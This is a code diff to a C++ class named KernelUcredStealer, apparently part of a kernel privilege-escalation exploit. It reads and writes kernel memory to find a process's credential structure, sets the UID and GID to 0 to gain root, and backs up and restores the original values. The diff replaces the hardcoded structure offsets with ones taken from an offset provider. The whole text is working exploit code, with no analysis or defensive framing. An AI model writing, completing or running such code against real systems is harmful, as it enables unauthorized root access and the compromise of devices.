@@ -74,7 +74,7 @@ void KernelUcredStealer::Steal(kernel::IKernelMemory* km,
     printf("[+] ucred at 0x%llx\n", ucred);
 
     // 4. 备份原始值
-    BackupUcred(km, ucred);
+    BackupUcred(km, ucred, offsets);
 
     // 5. 修改 UID/GID 为 0 (root)
     PatchUID(km, ucred, offsets);
@@ -85,23 +85,24 @@ void KernelUcredStealer::Steal(kernel::IKernelMemory* km,
     printf("[+] ucred patched: process now has root privileges\n");
 }
 
-void KernelUcredStealer::BackupUcred(kernel::IKernelMemory* km, uint64_t ucred) {
-    // 备份原始 UID/GID (偏移在运行时通过 offsets 获取)
-    // 这里简化处理，实际应使用 offsets->UcredUID() 等
-    orig_uid_ = km->Read<uint32_t>(ucred + 0x18);
-    orig_ruid_ = km->Read<uint32_t>(ucred + 0x1c);
-    orig_svuid_ = km->Read<uint32_t>(ucred + 0x20);
-    orig_gid_ = km->Read<uint32_t>(ucred + 0x24);
+void KernelUcredStealer::BackupUcred(kernel::IKernelMemory* km, uint64_t ucred,
+                                      kernel::IOffsetProvider* offsets) {
+    // 使用 offsets 提供的偏移, 与 PatchUID 保持一致
+    orig_uid_ = km->Read<uint32_t>(ucred + offsets->UcredUID());
+    orig_ruid_ = km->Read<uint32_t>(ucred + offsets->UcredRUID());
+    orig_svuid_ = km->Read<uint32_t>(ucred + offsets->UcredSVUID());
+    orig_gid_ = km->Read<uint32_t>(ucred + offsets->UcredGID());
 
-    printf("[+] Backed up ucred: uid=%d ruid=%d gid=%d\n",
-           orig_uid_, orig_ruid_, orig_gid_);
+    printf("[+] Backed up ucred: uid=%d ruid=%d svuid=%d gid=%d\n",
+           orig_uid_, orig_ruid_, orig_svuid_, orig_gid_);
 }
 
-void KernelUcredStealer::RestoreUcred(kernel::IKernelMemory* km, uint64_t ucred) {
-    km->Write<uint32_t>(ucred + 0x18, orig_uid_);
-    km->Write<uint32_t>(ucred + 0x1c, orig_ruid_);
-    km->Write<uint32_t>(ucred + 0x20, orig_svuid_);
-    km->Write<uint32_t>(ucred + 0x24, orig_gid_);
+void KernelUcredStealer::RestoreUcred(kernel::IKernelMemory* km, uint64_t ucred,
+                                       kernel::IOffsetProvider* offsets) {
+    km->Write<uint32_t>(ucred + offsets->UcredUID(), orig_uid_);
+    km->Write<uint32_t>(ucred + offsets->UcredRUID(), orig_ruid_);
+    km->Write<uint32_t>(ucred + offsets->UcredSVUID(), orig_svuid_);
+    km->Write<uint32_t>(ucred + offsets->UcredGID(), orig_gid_);
     printf("[+] ucred restored\n");
 }
 
